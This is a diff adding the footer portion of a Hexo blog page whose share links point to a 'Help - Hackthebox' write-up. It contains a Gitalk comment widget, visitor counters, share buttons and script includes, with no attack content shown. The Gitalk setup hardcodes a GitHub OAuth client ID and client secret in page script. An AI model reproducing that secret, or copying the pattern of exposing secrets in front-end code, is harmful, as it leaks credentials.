+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&title=《Help - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&title=《Help - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Help - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3awW4bMQwE0Pz/T7tATy2S2jOk5KTA25MRrL16e5CYIT8+4uvx+2rvfPxxfb7n83VqDfWFh4eHN1r680cmC02QOfVfa8jXjIeHh3ebl2/xw8csjpPn1BcWPDw8vG/lPf88OxLychkPDw/v/+UlP5q/js3hgYeHh/e9vE0QkGSnbdaavKbDWQseHh7emZRgWF7f/nyxv4eHh4e36Konm3U7CtAePKvV4uHh4V3g5Y9Moof9wEHb7op+Ew8PD+8ob7aVbw6PBLlpyP31Fzw8PLwLvHyTneFnjbTZcZLfg4eHh3eWV/+rXz6mLaaL7T65Ew8PD2/NywcC9gFBHtrOguOoa4eHh4e35uUhbHtPO4KQHwBJhFE0wPDw8PBKXh6kJm2t/Lubka+ilMfDw8O7xssjiXuDAvnrKIpvPDw8vDfy8g26bUrlMUQ+1hDFuHh4eHiHeLOm1D6YqPOSfOoBDw8P7zKvbXe1Y1V50+vUiy6yFjw8PLxFjTpr27eN/M1EWP5CX0QSeHh4eGtesvRZs6oNeZMQOT8S8PDw8O7xNnHDLFSdDVStQhA8PDy8o7wbwessStgU0C+GrvDw8PDewmsX0Q5UJYDkoKqrezw8PLw1b78d52Xu7KVsDio8PDy827y83ZV8d1M6t6+yODzw8PDw1rxNgNu+v+QX8tGBKBDBw8PDu8ybDUvNSt48ip2V8sdmwfDw8PDiCrmNCdrtvj1yZqU8Hh4e3g3eo7xmIUU+arA/DIrRATw8PLx5X361+bZjWHlJPXsuHh4e3nt4s9GrPIbIfznf9IsQBA8PD+8ab5ZhtLHspmHWRid4eHh4P4HXjj21QcY+nvjiTjw8PLwfwEu2+yR4bQe58kh3WFLj4eHhlbw2MrjX+E8iiec7Px4eHt5t3n4ROXt2GLRhbn3h4eHhpbxfMunFOlnDWMwAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
